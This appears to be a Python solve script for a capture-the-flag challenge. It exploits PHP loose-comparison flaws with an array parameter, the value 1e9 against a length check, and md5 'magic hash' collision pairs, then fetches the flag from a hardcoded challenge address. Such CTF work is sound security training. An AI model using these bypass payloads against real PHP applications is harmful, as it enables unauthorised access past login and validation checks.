#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTUCTF - PHP 弱类型三关 - 一键复现

用法:
    python solve_php_weak_type.py [target]      # 打靶机，输出 flag
    python solve_php_weak_type.py --check       # 离线自检：只验 md5 碰撞对与 payload 构造

默认 target: http://103.163.47.230:32849

三关 payload:
    第1关  GET  a[]=admin      数组 !== "admin"，但 a[0] == "admin"
    第2关  GET  num=1e9        strlen("1e9")=3 < 5，数值 1e9 > 10000
    第3关  POST x/y            md5 后都是 "0e..." 纯数字串，== 比较均为 0

靶机是动态容器，过期后连接会直接被断开，脚本会给出明确提示而不是抛栈。
"""
import re
import sys
import hashlib
import urllib.parse
import urllib.request

TARGET = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith("-") \
    else "http://103.163.47.230:32849"

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " \
     "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"

# 常见 md5 0e 幻数碰撞对（md5 结果形如 0e<纯数字>，被当作科学计数法后都等于 0）
MD5_COLLISION_PAIRS = [
    ("QNKCDZO", "240610708"),
    ("s878926199a", "s155964671a"),
    ("s1091221200a", "s1885207154a"),
    ("s1502113478a", "s1885207154a"),
    ("s1836677006a", "s155964671a"),
    ("s1184209335a", "s1665632922a"),
    ("s1665632922a", "s1502113478a"),
]


def is_magic_hash(s: str) -> bool:
    """md5 是否为 0e 开头的纯数字串（弱比较下等于 0）。"""
    h = hashlib.md5(s.encode()).hexdigest()
    return h.startswith("0e") and h[2:].isdigit()


def pick_pair():
    """挑第一对本地校验通过的碰撞对。"""
    for x, y in MD5_COLLISION_PAIRS:
        if x != y and is_magic_hash(x) and is_magic_hash(y):
            return x, y
    raise SystemExit("[-] 没有可用的 md5 碰撞对，请扩充 MD5_COLLISION_PAIRS")


def build_payload():
    """返回 (query_string, post_dict, x, y)。"""
    x, y = pick_pair()
    query = "a[]=" + urllib.parse.quote("admin") + "&num=1e9"
    return query, {"x": x, "y": y}, x, y


def self_check():
    query, post, x, y = build_payload()
    print("[*] 自检（不联网）")
    print(f"    第1关 query : {query}")
    print(f"    第2关 num   : len('1e9')={len('1e9')} < 5 且 1e9 > 10000 -> "
          f"{len('1e9') < 5 and float('1e9') > 10000}")
    print(f"    第3关 x/y   : {x} / {y}  (x != y -> {x != y})")
    hx, hy = hashlib.md5(x.encode()).hexdigest(), hashlib.md5(y.encode()).hexdigest()
    print(f"    md5({x}) = {hx}")
    print(f"    md5({y}) = {hy}")
    print(f"    两个 0e 数字串弱比较相等 -> {float(hx) == float(hy)}")
    ok = (len("1e9") < 5 and float("1e9") > 10000) and x != y \
        and is_magic_hash(x) and is_magic_hash(y)
    print("[+] 自检通过" if ok else "[-] 自检失败")
    return 0 if ok else 1


def strip_tags(html_text: str) -> str:
    """去掉 highlight_file 输出的 HTML 标签，只看正文。"""
    return re.sub(r"<[^>]+>", "", html_text)


def exploit(target: str = TARGET) -> str:
    query, post, x, y = build_payload()
    print(f"[*] 目标  : {target}")
    print("[*] 第1关: a[]=admin   (数组绕过 !== 与 == 的差异)")
    print("[*] 第2关: num=1e9     (长度 3 < 5，数值 1e9 > 10000)")
    print(f"[*] 第3关: x={x}  y={y}")

    url = target.rstrip("/") + "/?" + query
    data = urllib.parse.urlencode(post).encode()
    req = urllib.request.Request(
        url, data=data,
        headers={"User-Agent": UA, "Content-Type": "application/x-www-form-urlencoded"},
    )
    try:
        body = urllib.request.urlopen(req, timeout=25).read().decode("utf-8", "replace")
    except Exception as e:
        return f"[-] 请求失败（动态容器可能已过期）: {e}"

    text = strip_tags(body)
    m = re.search(r"(HTUCTF\{[^}]*\})", text)
    return m.group(1) if m else text[-300:]


if __name__ == "__main__":
    if "--check" in sys.argv:
        sys.exit(self_check())
    print("[+] FLAG:", exploit(TARGET))
